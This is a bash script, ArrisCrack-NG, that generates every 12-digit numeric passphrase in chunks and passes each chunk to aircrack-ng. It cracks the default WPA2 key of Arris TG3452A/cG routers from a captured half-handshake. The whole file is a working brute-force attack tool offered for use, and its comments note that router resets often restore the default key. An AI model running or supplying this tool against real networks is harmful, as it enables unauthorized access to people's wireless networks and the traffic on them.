#!/bin/bash



echo ▄▀█ █▀█ █▀█ █ █▀ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ ▄▄ █▄░█ █▀▀
echo █▀█ █▀▄ █▀▄ █ ▄█ █▄▄ █▀▄ █▀█ █▄▄ █░█ ░░ █░▀█ █▄█ v1.2
 
#The Arris TG3452A/cG makes use of a 12 digit numeric string for default WPA2 Passphrase
#Even if an admin changes the default password a reset or update can sometimes put it back to default settings (often)
#ArrisCrack-NG interacts with the Aircrack-NG suite and will test all possible combinations offline until the passphrase is broken.
#In order to use the script you must first capture a Half Handshake and supply the script with the capture file.
                                                         

# Define the range of 12-digit numbers
start=000000000000
end=999999999999

# Define the number of lines per output file (1 million lines)
lines_per_file=1000000

# Calculate the total number of files needed
total_files=$(( (end - start + 1) / lines_per_file ))

# Prompt the user to specify the path to the target file (Half Handshake Capture File)
read -p "Enter the path to the Half Handshake Capture file for aircrack-ng: " target_file

# Validate that aircrack-ng is installed
if ! command -v aircrack-ng &>/dev/null; then
  echo "aircrack-ng is not installed. Please install it and try again."
  exit 1
fi

file_number=1  # Start with file 1

while true; do
  # Calculate the starting and ending points for the selected output file
  start_range=$((start + (file_number - 1) * lines_per_file + 1))
  end_range=$((start_range + lines_per_file - 1))

  # Generate the numbers and write them to the selected output file
  output_file="numbers_file$file_number.txt"

  for ((i = start_range; i <= end_range; i++)); do
    printf "%012d\n" "$i"
  done > "$output_file"

  echo "File $output_file created with $lines_per_file lines."

  # Use aircrack-ng to search for a match in the target file
  echo "Searching for a match in $target_file using aircrack-ng..."
  aircrack-ng -w "$output_file" "$target_file"

  # Check if aircrack found the key
  if [ $? -eq 0 ]; then
    echo "Key found! Stopping the script."
    break
  else
    file_number=$((file_number + 1))  # Increment the file number
    # Remove the previous output file to save storage
    if [ $file_number -gt 1 ]; then
      prev_file_number=$((file_number - 1))
      prev_output_file="numbers_file$prev_file_number.txt"
      rm "$prev_output_file"
      echo "Removed previous file $prev_output_file to save storage."
    fi
  fi
done
